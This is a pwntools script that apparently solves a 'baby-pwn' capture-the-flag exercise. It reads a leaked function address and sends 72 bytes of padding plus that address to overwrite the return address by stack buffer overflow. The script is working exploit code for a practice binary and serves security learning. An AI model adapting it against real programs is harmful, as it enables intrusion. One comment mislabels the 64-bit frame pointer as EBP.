from pwn import *

# Set up the binary and context
binary = './baby-pwn'
context.binary = binary

if args.REMOTE:
    # Connect to the remote server
    p = remote('localhost', 5000)
else:
    # Start the process
    p = process(binary)

# Find the address of the secret function
p.recvline()
secret_addr = int(p.recvline().strip().split()[-1], 16)

# Craft the payload
payload = b'A' * 72  # Overflow the buffer (64 bytes) + saved EBP (8 bytes)
# Overwrite the return address with the address of the secret function
payload += p64(secret_addr)

# Send the payload
p.sendline(payload)

# Interact with the process to see the output
print(p.recvall())
p.close()
